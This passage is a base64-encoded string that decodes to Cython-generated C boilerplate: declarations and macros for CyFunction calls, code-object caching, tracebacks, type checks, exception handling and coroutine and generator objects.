dERlZmF1bHRzKFB5T2JqZWN0ICpmdW5jLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlUeXBlT2JqZWN0ICpkZWZhdWx0c190eXBlKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXREZWZhdWx0c1R1cGxlKFB5T2JqZWN0ICptLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKnR1cGxlKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXREZWZhdWx0c0t3RGljdChQeU9iamVjdCAqbSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGljdCk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0QW5ub3RhdGlvbnNEaWN0KFB5T2JqZWN0ICptLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGljdCk7XG5zdGF0aWMgaW50IF9fcHl4X0N5RnVuY3Rpb25faW5pdChQeU9iamVjdCAqbW9kdWxlKTtcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX05PQVJHUyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7XG5zdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7XG5zdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFMoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7XG4jaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChmKSAoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmKS0+ZnVuY192ZWN0b3JjYWxsKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoZikgKCgoUHlDRnVuY3Rpb25PYmplY3QqKWYpLT52ZWN0b3JjYWxsKVxuI2VuZGlmXG4jZW5kaWZcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fTmV3KFB5TWV0aG9kRGVmICptbCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqZ2xvYmFscyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QqIGNvZGUpO1xuXG5cbiNpZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLICYmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRVxuc3RhdGljIGludCBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhQeVRocmVhZFN0YXRlICp0c3RhdGUsIGludCBjX2xpbmUpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2sodHN0YXRlLCBjX2xpbmUpICAoKChDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLKSkgPyBjX2xpbmUgOiAwKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnR5cGVkZWYgUHlPYmplY3QgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGU7XG4jZWxzZVxudHlwZWRlZiBQeUNvZGVPYmplY3QgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGU7XG4jZW5kaWZcbnR5cGVkZWYgc3RydWN0IHtcbiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3Q7XG4gICAgaW50IGNvZGVfbGluZTtcbn0gX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnk7XG5zdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlIHtcbiAgICBpbnQgY291bnQ7XG4gICAgaW50IG1heF9jb3VudDtcbiAgICBfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSogZW50cmllcztcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgX19weXhfYXRvbWljX2ludF90eXBlIGFjY2Vzc29yX2NvdW50O1xuICAjZW5kaWZcbn07XG5zdGF0aWMgaW50IF9fcHl4X2Jpc2VjdF9jb2RlX29iamVjdHMoX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXMsIGludCBjb3VudCwgaW50IGNvZGVfbGluZSk7XG5zdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X2ZpbmRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSk7XG5zdGF0aWMgdm9pZCBfX3B5eF9pbnNlcnRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSwgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0KTtcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9BZGRUcmFjZWJhY2soY29uc3QgY2hhciAqZnVuY25hbWUsIGludCBjX2xpbmUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHB5X2xpbmUsIGNvbnN0IGNoYXIgKmZpbGVuYW1lKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxudHlwZWRlZiBQeU9iamVjdCAqX19QeXhfVHlwZU5hbWU7XG4jZGVmaW5lIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJVUiXG4jZGVmaW5lIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShvYmopIFB5X1hERUNSRUYob2JqKVxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lIFB5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWVcbiNlbHNlXG5zdGF0aWMgX19QeXhfVHlwZU5hbWUgX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeVR5cGVPYmplY3QqIHRwKTtcbiNlbmRpZlxuI2Vsc2UgIC8vICFMSU1JVEVEX0FQSVxudHlwZWRlZiBjb25zdCBjaGFyICpfX1B5eF9UeXBlTmFtZTtcbiNkZWZpbmUgX19QeXhfRk1UX1RZUEVOQU1FICIlLjIwMHMiXG4jZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUodHApICgodHApLT50cF9uYW1lKVxuI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKVxuI2VuZGlmXG5cblxuI2lmICFkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmIGRlZmluZWQoX19HTlVDX18pICYmIChfX0dOVUNfXyA+IDQgfHwgKF9fR05VQ19fID09IDQgJiYgX19HTlVDX01JTk9SX18gPj0gNikpXG4jZGVmaW5lIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQ1xuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcobG9uZyB2YWx1ZSk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgbG9uZyBfX1B5eF9QeUxvbmdfQXNfbG9uZyhQeU9iamVjdCAqKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0FzX2ludChQeU9iamVjdCAqKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4jZGVmaW5lIF9fUHl4X1R5cGVDaGVjayhvYmosIHR5cGUpIF9fUHl4X0lzU3VidHlwZShQeV9UWVBFKG9iaiksIChQeVR5cGVPYmplY3QgKil0eXBlKVxuI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2syKG9iaiwgdHlwZTEsIHR5cGUyKSBfX1B5eF9Jc0FueVN1YnR5cGUyKFB5X1RZUEUob2JqKSwgKFB5VHlwZU9iamVjdCAqKXR5cGUxLCAoUHlUeXBlT2JqZWN0ICopdHlwZTIpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNTdWJ0eXBlKFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Jc0FueVN1YnR5cGUyKFB5VHlwZU9iamVjdCAqY2xzLCBQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlMSwgUHlPYmplY3QgKnR5cGUyKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1R5cGVDaGVjayhvYmosIHR5cGUpIFB5T2JqZWN0X1R5cGVDaGVjayhvYmosIChQeVR5cGVPYmplY3QgKil0eXBlKVxuI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2syKG9iaiwgdHlwZTEsIHR5cGUyKSAoUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgKFB5VHlwZU9iamVjdCAqKXR5cGUxKSB8fCBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZTIpKVxuI2RlZmluZSBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlKSBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoUHlPYmplY3QgKmVyciwgUHlPYmplY3QgKnR5cGUxLCBQeU9iamVjdCAqdHlwZTIpIHtcbiAgICByZXR1cm4gUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZTEpIHx8IFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUyKTtcbn1cbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzMihlcnIxLCBlcnIyKSAgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpLCBlcnIxLCBlcnIyKVxuI2RlZmluZSBfX1B5eF9QeUV4Y2VwdGlvbl9DaGVjayhvYmopIF9fUHl4X1R5cGVDaGVjayhvYmosIFB5RXhjX0V4Y2VwdGlvbilcbiNpZmRlZiBQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrXG4gICNkZWZpbmUgX19QeXhfUHlCYXNlRXhjZXB0aW9uX0NoZWNrKG9iaikgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayhvYmopXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5QmFzZUV4Y2VwdGlvbl9DaGVjayhvYmopIF9fUHl4X1R5cGVDaGVjayhvYmosIFB5RXhjX0Jhc2VFeGNlcHRpb24pXG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSk7XG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuI2RlZmluZSBfX1B5eF9FeGNlcHRpb25Td2FwKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19FeGNlcHRpb25Td2FwKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FeGNlcHRpb25Td2FwKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJdGVyX05leHRfUGxhaW4oUHlPYmplY3QgKml0ZXJhdG9yKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUEkodm9pZCk7XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKFB5T2JqZWN0KiBmdW5jdGlvbiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTtcblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QxKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBtZXRob2RfbmFtZSwgUHlPYmplY3QqIGFyZyk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYywgaW50IGl0ZXJuZXh0KTtcblxuXG5zdHJ1Y3QgX19weXhfQ29yb3V0aW5lT2JqZWN0O1xudHlwZWRlZiBQeU9iamVjdCAqKCpfX3B5eF9jb3JvdXRpbmVfYm9keV90KShzdHJ1Y3QgX19weXhfQ29yb3V0aW5lT2JqZWN0ICosIFB5VGhyZWFkU3RhdGUgKiwgUHlPYmplY3QgKik7XG4jaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuI2RlZmluZSBfX1B5eF9FeGNJbmZvU3RydWN0ICBfUHlFcnJfU3RhY2tJdGVtXG4jZWxzZVxudHlwZWRlZiBzdHJ1Y3Qge1xuICAgIFB5T2JqZWN0ICpleGNfdHlwZTtcbiAgICBQeU9iamVjdCAqZXhjX3ZhbHVlO1xuICAgIFB5T2JqZWN0ICpleGNfdHJhY2ViYWNrO1xufSBfX1B5eF9FeGNJbmZvU3RydWN0O1xuI2VuZGlmXG50eXBlZGVmIHN0cnVjdCBfX3B5eF9Db3JvdXRpbmVPYmplY3Qge1xuICAgIFB5T2JqZWN0X0hFQURcbiAgICBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHk7XG4gICAgUHlPYmplY3QgKmNsb3N1cmU7XG4gICAgX19QeXhfRXhjSW5mb1N0cnVjdCBnaV9leGNfc3RhdGU7XG4gICAgUHlPYmplY3QgKmdpX3dlYWtyZWZsaXN0O1xuICAgIFB5T2JqZWN0ICpjbGFzc29iajtcbiAgICBQeU9iamVjdCAqeWllbGRmcm9tO1xuICAgIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyB5aWVsZGZyb21fYW1fc2VuZDtcbiAgICBQeU9iamVjdCAqZ2lfbmFtZTtcbiAgICBQeU9iamVjdCAqZ2lfcXVhbG5hbWU7XG4gICAgUHlPYmplY3QgKmdpX21vZHVsZW5hbWU7XG4gICAgUHlPYmplY3QgKmdpX2NvZGU7XG4gICAgUHlPYmplY3QgKmdpX2ZyYW1lO1xuI2lmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgJiYgKENZVEhPTl9QUk9GSUxFIHx8IENZVEhPTl9UUkFDRSlcbiAgICBQeU1vbml0b3JpbmdTdGF0ZSBfX3B5eF9weW1vbml0b3Jpbmdfc3RhdGVbX19QeXhfTW9uaXRvcmluZ0V2ZW50VHlwZXNfQ3lHZW5fY291bnRdO1xuICAgIHVpbnQ2NF90IF9fcHl4X3B5bW9uaXRvcmluZ192ZXJzaW9uO1xuI2VuZGlmXG4gICAgaW50IHJlc3VtZV9sYWJlbDtcbiAgICBjaGFyIGlzX3J1bm5pbmc7XG59IF9fcHl4X0Nvcm91dGluZU9iamVjdDtcbnN0YXRpYyBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fUHl4X19Db3JvdXRpbmVfTmV3KFxuICAgIFB5VHlwZU9iamVjdCAqdHlwZSwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsXG4gICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKTtcbnN0YXRpYyBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fUHl4X19Db3JvdXRpbmVfTmV3SW5pdChcbiAgICAgICAgICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHksIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqY2xvc3VyZSxcbiAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcihfX1B5eF9FeGNJbmZvU3RydWN0ICpzZWxmKTtcbnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX2NsZWFyKFB5T2JqZWN0ICpzZWxmKTtcbnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX0FtU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCk7XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUpO1xuc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdCBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICoqcmV0dmFsKTtcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmdzKTtcbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4jZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9Td2FwRXhjZXB0aW9uKHNlbGYpXG4jZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKHNlbGYpICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoJihzZWxmKS0+Z2lfZXhjX3N0YXRlKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1N3YXBFeGNlcHRpb24oc2VsZikge1xcXG4gICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3R5cGUsICYoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUsICYoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHJhY2ViYWNrKTtcXFxuICAgIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoJihzZWxmKS0+Z2lfZXhjX3N0YXRlKTtcXFxuICAgIH1cbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oc2VsZikge1xcXG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3R5cGUsIChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSwgKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayk7XFxcbiAgICAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHlwZSA9IChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSA9IChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2sgPSBOVUxMO1xcXG4gICAgfVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5R2VuX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKHB2YWx1ZSlcXFxuICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX3B5eF90c3RhdGUsIHB2YWx1ZSlcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5R2VuX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKHB2YWx1ZSlcXFxuICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHB2YWx1ZSlcbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnB2YWx1ZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKTtcbnN0YXRpYyBjaGFyIF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbik7XG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbik7XG5zdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyKFB5T2JqZWN0ICpnZW4sIHZvaWQgKmNsb3N1cmUpO1xuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbnN0YXRpYyB2b2lkIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChQeVR5cGVPYmplY3QgKnR5cGUsIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0ICpzdGF0aWNfYW1zZW5kX21ldGhvZHMsIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kKTtcbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcpO1xuXG5cbiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX1VTRURcbiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3Qob2JqKSBfX1B5eF9JU19UWVBFKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfR2VuZXJhdG9yVHlwZSlcbiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX05ldyhib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpXFxcbiAgICBfX1B5eF9fQ29yb3V0aW5lX05ldyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9OZXh0KFB5T2JqZWN0ICpzZWxmKTtcbnN0YXRpYyBpbnQgX19weXhfR2VuZXJhdG9yX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoUHlPYmplY3QgKnNlbGYpO1xuXG5cbnN0YXRpYyB1bnNpZ25lZCBsb25nIF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24odm9pZCk7XG5cblxuc3RhdGljIGludCBfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbih1bnNpZ25lZCBsb25nIGN0X3ZlcnNpb24sIHVuc2lnbmVkIGxvbmcgcnRfdmVyc2lvbiwgaW50IGFsbG93X25ld2VyKTtcblxuXG4jaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUICYmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUodm9pZCopO1xuc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGUoUHlPYmplY3QqIG1vZHVsZSwgdm9pZCopO1xuc3RhdGljIGludCBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUodm9pZCopO1xuI2VsaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiNkZWZpbmUgX19QeXhfU3RhdGVfRmluZE1vZHVsZSBQeVN0YXRlX0ZpbmRNb2R1bGVcbiNkZWZpbmUgX19QeXhfU3RhdGVfQWRkTW9kdWxlIFB5U3RhdGVfQWRkTW9kdWxlXG4jZGVmaW5lIF9fUHl4X1N0YXRlX1JlbW92ZU1vZHVsZSBQeVN0YXRlX1JlbW92ZU1vZHVsZVxuI2VuZGlmXG5cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAgICAgICAjZGVmaW5lIF9fUFlYX0ZBU1RDQUxMX0FCSV9TVUZGSVggICJfZmFzdGNhbGwiXG4gICAgI2Vsc2VcbiAgICAgICAgI2RlZmluZSBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYXG4gICAgI2VuZGlmXG4gICAgI2RlZmluZSBfX1BZWF9MSU1JVEVEX0FCSV9TVUZGSVggImxpbWl0ZWQiIF9fUFlYX0ZBU1RDQUxMX0FCSV9TVUZGSVggX19QWVhfQU1fU0VORF9BQklfU1VGRklYXG4jZWxzZVxuICAgICNkZWZpbmUgX19QWVhfTElNSVRFRF9BQklfU1VGRklYXG4jZW5kaWZcbiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAxXG4gICAgI2RlZmluZSBfX1BZWF9BTV9TRU5EX0FCSV9TVUZGSVhcbiNlbGlmIF9fUFlYX0hBU19QWV9BTV9TRU5EI